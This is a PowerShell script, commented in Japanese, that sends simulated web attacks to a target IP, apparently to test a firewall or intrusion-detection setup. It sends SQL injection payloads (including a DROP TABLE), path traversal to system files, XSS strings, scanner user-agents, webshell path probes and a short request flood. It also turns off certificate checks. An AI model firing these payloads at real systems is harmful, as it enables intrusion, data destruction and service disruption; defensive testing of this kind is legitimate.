# PowerShell攻撃テストスクリプト
# Windows PCからの攻撃をシミュレートするためのPowerShellスクリプト

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,
    
    [int]$HttpPort = 8080,
    [int]$HttpsPort = 443
)

$BaseUrlHttp = "http://${TargetIP}:${HttpPort}"
$BaseUrlHttps = "https://${TargetIP}:${HttpsPort}"
$LogFile = "attack_test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

Write-Host "🚀 PowerShell攻撃テスト開始" -ForegroundColor Green
Write-Host "ターゲット: $TargetIP"
Write-Host "HTTP URL: $BaseUrlHttp"
Write-Host "HTTPS URL: $BaseUrlHttps"
Write-Host "================================"

# SSL証明書エラーを無視
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ログ関数
function Log-Attack {
    param($AttackType, $Url, $StatusCode)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] $AttackType`: $Url -> $StatusCode"
    Write-Host $logEntry
    $logEntry | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

# HTTP リクエスト関数
function Invoke-AttackRequest {
    param($Url, $UserAgent = $null, $Method = "GET", $Body = $null)
    
    try {
        $headers = @{}
        if ($UserAgent) {
            $headers["User-Agent"] = $UserAgent
        }
        
        if ($Method -eq "GET") {
            $response = Invoke-WebRequest -Uri $Url -Headers $headers -TimeoutSec 10 -ErrorAction Stop
        } else {
            $response = Invoke-WebRequest -Uri $Url -Method $Method -Headers $headers -Body $Body -TimeoutSec 10 -ErrorAction Stop
        }
        
        return $response.StatusCode
    }
    catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            return [int]$_.Exception.Response.StatusCode
        }
        return 0  # ブロックされた可能性
    }
    catch {
        return 0  # その他のエラー
    }
}

# 基本接続テスト
Write-Host "🔍 基本接続テスト..." -ForegroundColor Yellow
$statusCode = Invoke-AttackRequest -Url $BaseUrlHttp
Log-Attack "Basic Connection" $BaseUrlHttp $statusCode

if ($statusCode -eq 0) {
    Write-Host "⚠️  警告: ターゲットに接続できません" -ForegroundColor Red
    exit 1
}

# SQLインジェクション攻撃
Write-Host "🎯 SQLインジェクション攻撃..." -ForegroundColor Cyan
$sqlPayloads = @(
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "1 UNION SELECT * FROM users",
    "admin'--",
    "' OR 'a'='a",
    "1' AND (SELECT COUNT(*) FROM users) > 0--"
)

foreach ($payload in $sqlPayloads) {
    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
    $url = "${BaseUrlHttp}?id=${encodedPayload}"
    $statusCode = Invoke-AttackRequest -Url $url
    Log-Attack "SQL Injection" $url $statusCode
    Start-Sleep -Milliseconds 500
}

# パストラバーサル攻撃
Write-Host "🎯 パストラバーサル攻撃..." -ForegroundColor Cyan
$pathPayloads = @(
    "../../../etc/passwd",
    "..\..\..\..\windows\system32\drivers\etc\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd"
)

foreach ($payload in $pathPayloads) {
    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
    $url = "${BaseUrlHttp}?file=${encodedPayload}"
    $statusCode = Invoke-AttackRequest -Url $url
    Log-Attack "Path Traversal" $url $statusCode
    Start-Sleep -Milliseconds 500
}

# 悪意のあるUser-Agent攻撃
Write-Host "🎯 悪意のあるUser-Agent攻撃..." -ForegroundColor Cyan
$maliciousUAs = @(
    "sqlmap/1.0",
    "Nikto/2.1.6",
    "w3af.org",
    "Nessus",
    "python-requests/2.25.1 (scanner)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0)"
)

foreach ($ua in $maliciousUAs) {
    $statusCode = Invoke-AttackRequest -Url $BaseUrlHttp -UserAgent $ua
    Log-Attack "Malicious User-Agent" "$BaseUrlHttp (UA: $ua)" $statusCode
    Start-Sleep -Milliseconds 500
}

# 404スキャン攻撃
Write-Host "🎯 404スキャン攻撃..." -ForegroundColor Cyan
$scanPaths = @(
    "/admin", "/administrator", "/admin.php", "/wp-admin",
    "/phpmyadmin", "/backup", "/config.php", "/login",
    "/shell.php", "/cmd.php", "/webshell.php"
)

foreach ($path in $scanPaths) {
    $url = "${BaseUrlHttp}${path}"
    $statusCode = Invoke-AttackRequest -Url $url
    Log-Attack "404 Scan" $url $statusCode
    Start-Sleep -Milliseconds 200
}

# XSS攻撃
Write-Host "🎯 XSS攻撃..." -ForegroundColor Cyan
$xssPayloads = @(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>"
)

foreach ($payload in $xssPayloads) {
    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
    $url = "${BaseUrlHttp}?q=${encodedPayload}"
    $statusCode = Invoke-AttackRequest -Url $url
    Log-Attack "XSS Attack" $url $statusCode
    Start-Sleep -Milliseconds 500
}

# DoS攻撃（軽量版）
Write-Host "🎯 DoS攻撃（10秒間）..." -ForegroundColor Cyan
$endTime = (Get-Date).AddSeconds(10)
$dosCount = 0

while ((Get-Date) -lt $endTime) {
    $statusCode = Invoke-AttackRequest -Url $BaseUrlHttp
    $dosCount++
    
    if ($dosCount % 10 -eq 0) {
        Log-Attack "DoS Attack" "$BaseUrlHttp (request #$dosCount)" $statusCode
    }
    Start-Sleep -Milliseconds 100
}

# HTTPS攻撃テスト
Write-Host "🎯 HTTPS攻撃テスト..." -ForegroundColor Cyan
$statusCode = Invoke-AttackRequest -Url $BaseUrlHttps
Log-Attack "HTTPS Test" $BaseUrlHttps $statusCode

# 結果サマリー
Write-Host "================================" -ForegroundColor Green
Write-Host "✅ 攻撃テスト完了" -ForegroundColor Green
Write-Host "📄 ログファイル: $LogFile"

$logContent = Get-Content $LogFile
$totalRequests = $logContent.Count
$blockedRequests = ($logContent | Where-Object { $_ -match " 0$" }).Count
$notFoundRequests = ($logContent | Where-Object { $_ -match " 404$" }).Count
$successRequests = ($logContent | Where-Object { $_ -match " 200$" }).Count

Write-Host ""
Write-Host "📊 結果サマリー:" -ForegroundColor Yellow
Write-Host "総リクエスト数: $totalRequests"
Write-Host "ブロック数 (0): $blockedRequests"
Write-Host "404エラー: $notFoundRequests"
Write-Host "成功 (200): $successRequests"
Write-Host ""
Write-Host "詳細は $LogFile を確認してください。"

# システム情報をログに追加
$systemInfo = @"

=== システム情報 ===
実行日時: $(Get-Date)
実行マシン: $env:COMPUTERNAME
ユーザー: $env:USERNAME
PowerShell バージョン: $($PSVersionTable.PSVersion)
OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
"@

$systemInfo | Out-File -FilePath $LogFile -Append -Encoding UTF8
